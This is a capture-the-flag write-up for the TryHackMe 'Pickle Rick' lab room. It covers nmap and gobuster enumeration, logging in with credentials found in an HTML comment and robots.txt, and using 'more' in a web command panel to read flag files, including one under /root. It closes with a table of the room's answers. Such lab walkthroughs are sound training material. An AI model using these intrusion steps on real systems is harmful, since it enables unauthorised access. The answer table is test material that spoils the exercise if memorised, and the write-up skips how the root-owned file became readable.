
# 🥒 TryHackMe CTF: Pickle Rick

---

## 📌 Room Name
**Pickle Rick**  
🔗 [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)

---

## 💻 Target IP
```

10.10.211.109

````

---

## 🛠️ Step 1: Connect to VPN

Connected to TryHackMe network using OpenVPN.

```bash
sudo openvpn yourconfig.ovpn
````

---

## 🔍 Step 2: Scan with Nmap

```bash
nmap -sC -sV -oN nmap.txt 10.10.211.109
```

### Open Ports:

```
22/tcp open  ssh
80/tcp open  http
```

---

## 🌐 Step 3: Explore the Website

Visited `http://10.10.211.109` and found:

* Hidden **HTML comment**:

  ```
  Username: R1ckRul3s
  ```
* Found `/robots.txt` with:

  ```
  Wubbalubbadubdub
  ```

---

## 🔍 Step 4: Find Hidden Pages

Used Gobuster/ffuf to discover `/command` page.

```bash
gobuster dir -u http://10.10.211.109/ -w /usr/share/wordlists/dirb/common.txt
```

---

## 🔐 Step 5: Log into Command Panel

URL:

```
http://10.10.211.109/command
```

* Username: `R1ckRul3s`
* Password: `Wubbalubbadubdub`

A command panel appears, allowing basic Linux commands.

---

## 🧪 Step 6: Find the Ingredients

Used `more` to bypass disabled commands.

### ✅ First Ingredient

```bash
more Sup3rS3cretPickl3Ingred.txt
```

**Answer:** `mr. meeseek hair`

### ✅ Second Ingredient

```bash
more /home/rick/second_ingredient.txt
```

**Answer:** `1 jerry tear`

### ✅ Final Ingredient

```bash
more /root/third_ingredient.txt
```

**Answer:** `fleeb juice`

---

## ✅ Final Answers

| Question                           | Answer             |
| ---------------------------------- | ------------------ |
| First ingredient Rick needs        | `mr. meeseek hair` |
| Second ingredient in Rick’s potion | `1 jerry tear`     |
| Last and final ingredient          | `fleeb juice`      |

---

## 🏁 Completion Proof

> ![Successfully Completed the Room](images/completed.png)

---

## 📝 Notes

* Learned basic web enumeration
* Used credential hints from HTML and robots.txt
* Navigated a restricted command shell interface

---

## ✅ Done!

CTF Room fully completed and all answers submitted.

 
